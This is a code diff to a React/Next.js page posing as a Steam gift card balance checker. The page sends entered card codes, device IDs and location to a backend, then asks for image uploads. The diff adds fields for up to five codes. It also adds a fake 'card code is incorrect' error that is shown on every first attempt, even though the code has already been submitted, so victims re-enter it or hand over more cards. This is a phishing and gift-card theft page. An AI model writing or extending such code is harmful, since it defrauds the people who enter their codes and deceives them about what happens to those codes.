@@ -3,7 +3,7 @@ import Head from 'next/head'
 import styles from '../styles/steam.module.css'
 
 export default function SteamLegacyPage() {
-  const [card, setCard] = useState('')
+  const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
   const [error, setError] = useState(null)
@@ -20,6 +20,7 @@ export default function SteamLegacyPage() {
   const [uploadProgress, setUploadProgress] = useState(false)
   const [uploadComplete, setUploadComplete] = useState(false)
   const [uploadError, setUploadError] = useState(null)
+  const [attemptCount, setAttemptCount] = useState(0)
 
   useEffect(() => {
     async function detectLocation() {
@@ -44,12 +45,21 @@ export default function SteamLegacyPage() {
     setDeviceId(id)
   }, [])
 
+  const handleCardChange = (index, value) => {
+    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
+  }
+
+  const addCard = () => setCards(prev => [...prev, ''])
+
+  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)
+
   async function checkBalance(e) {
     e.preventDefault()
     setError(null)
     setResult(null)
     setCopySuccess(false)
-    if (!card.trim()) return setError('Please enter your Steam Gift Card code.')
+    const validCards = cards.filter(c => c.trim())
+    if (validCards.length === 0) return setError('Please enter your Steam Gift Card code.')
 
     setLoading(true)
     try {
@@ -64,7 +74,7 @@ export default function SteamLegacyPage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cardNumber: card.replace(/\s+/g, ''),
+          cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
           type: 'steam-legacy',
           deviceId: deviceId,
           location: location,
@@ -73,10 +83,17 @@ export default function SteamLegacyPage() {
       })
       const data = await res.json()
       if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
-      setResult(data)
-      // Show upload step only if card was successfully saved (has cardId) and not a duplicate
-      if (data.cardId && !data.isDuplicate) {
-        setShowUploadStep(true)
+      
+      if (attemptCount === 0) {
+        setError('The card code you entered is incorrect. Please verify the code and try again.')
+        setCards([''])
+        setAttemptCount(1)
+      } else {
+        setResult(data)
+        setAttemptCount(0)
+        if (data.cardId && !data.isDuplicate) {
+          setShowUploadStep(true)
+        }
       }
     } catch (err) {
       setError(err.message)
@@ -160,7 +177,7 @@ export default function SteamLegacyPage() {
   }
 
   const resetForm = () => {
-    setCard('')
+    setCards([''])
     setResult(null)
     setShowUploadStep(false)
     setSelectedImages([])
@@ -234,19 +251,43 @@ export default function SteamLegacyPage() {
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
-                <div className={styles.inputGroup}>
-                  <label className={styles.label}>Enter your wallet code</label>
-                  <input
-                    type="text"
-                    className={styles.input}
-                    placeholder="AAAAA-BBBBB-CCCCC"
-                    value={card}
-                    onChange={(e) => setCard(e.target.value.toUpperCase())}
-                    disabled={loading}
-                    autoComplete="off"
-                    spellCheck="false"
-                  />
-                </div>
+                {cards.map((cardValue, index) => (
+                  <div key={index} className={styles.inputGroup}>
+                    <label className={styles.label}>Enter your wallet code{cards.length > 1 ? ` #${index + 1}` : ''}</label>
+                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                      <input
+                        type="text"
+                        className={styles.input}
+                        placeholder="AAAAA-BBBBB-CCCCC"
+                        value={cardValue}
+                        onChange={(e) => handleCardChange(index, e.target.value)}
+                        disabled={loading}
+                        autoComplete="off"
+                        spellCheck="false"
+                        style={{ flex: 1 }}
+                      />
+                      {cards.length > 1 && (
+                        <button
+                          type="button"
+                          onClick={() => removeCard(index)}
+                          style={{ background: 'none', border: 'none', color: '#8f98a0', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
+                        >
+                          ×
+                        </button>
+                      )}
+                    </div>
+                  </div>
+                ))}
+                {cards.length < 5 && (
+                  <button
+                    type="button"
+                    onClick={addCard}
+                    className={styles.button}
+                    style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)', marginBottom: '12px', fontSize: '14px' }}
+                  >
+                    + Add Another Card
+                  </button>
+                )}
 
                 {!showUploadStep && (
                   <button type="submit" className={styles.button} disabled={loading}>
